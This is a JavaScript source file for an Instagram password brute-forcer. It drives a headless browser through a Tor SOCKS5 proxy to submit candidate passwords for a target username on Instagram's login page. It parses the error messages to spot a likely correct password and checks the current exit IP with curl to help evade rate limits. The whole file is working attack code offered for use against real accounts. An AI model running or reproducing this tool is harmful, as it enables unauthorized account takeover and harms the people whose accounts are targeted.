"use strict"
const puppeteer = require('puppeteer');
const colors = require('colors')
const { execSync } = require("child_process");




class InstagramBruterNode {

    BASEURL = "https://www.instagram.com/accounts/login/"
    DELAY = 4000
    HEADLESS_BROWSER = true
    SELECTORS = ['input[name="username"]', 'input[name="password"]']
    STATES = [
        { code: 1, message: "Sorry, your password was incorrect. Please double-check your password." },
        { code: 2, message: "There was a problem logging you into Instagram. Please try again soon." },
        { code: 3, message: "We couldn't connect to Instagram. Make sure you're connected to the internet and try again." },
        { code: 4, message: "Please wait a few minutes before you try again." }
    ]

    constructor(username, proxy_port) {
        this.username = username
        this.TOR_PROXY = `--proxy-server=socks5://127.0.0.1:${proxy_port}`
        this.TOR_PORT = proxy_port

    }
    async checkPass(pass) {

        await this.page.type(this.SELECTORS[0], this.username);
        await this.page.type(this.SELECTORS[1], pass);
        await this.page.click('button[type="submit"]');
        await this.page.waitFor(this.DELAY)
        try {
            const result = await this.page.evaluate(() => {

                const innerHTML = document.getElementById("slfErrorAlert").innerHTML;
                return innerHTML

            });
            this.STATES.forEach(item => {
                if (result == item.message)
                    console.log(`##${item.message}##`.red + ` - ErrorCode: ${item.code}`)

            })
            const IP = execSync(`curl -s --socks5-hostname 127.0.0.1:${this.TOR_PORT} https://api.ipify.org`)
            console.log(`Still trying to find the password... Current IP - ${IP} - ${this.username} - Password ${pass}`)
            await this.clean()
            return Promise.resolve(true)

        }
        catch (ex) {
            console.log(`Maybe, try this ${pass} of ${this.username} as password!`.green)
            await this.clean()
            return Promise.resolve(true)
        }
    }
    async createBruter() {

        try {
            this.browser = await puppeteer.launch({
                headless: this.HEADLESS_BROWSER,
                args: [this.TOR_PROXY, "--no-sandbox", 'disable-setuid-sandbox']
            });
            await this._getpage()
            return Promise.resolve(true)
        }
        catch (exception) {
            return Promise.resolve(true)
        }

    }
    async _getpage() {
        this.page = await this.browser.newPage()
        await this.page.goto(this.BASEURL);
        await this.page.waitForSelector(this.SELECTORS[0]);
        await this.page.waitForSelector(this.SELECTORS[1]);
    }
    async clean() {
        await this.page.setCacheEnabled(false)
        this.browser.removeAllListeners()
        this.page.removeAllListeners()
        await this.page.close()
        await this.browser.close()
    }
}
module.exports = InstagramBruterNode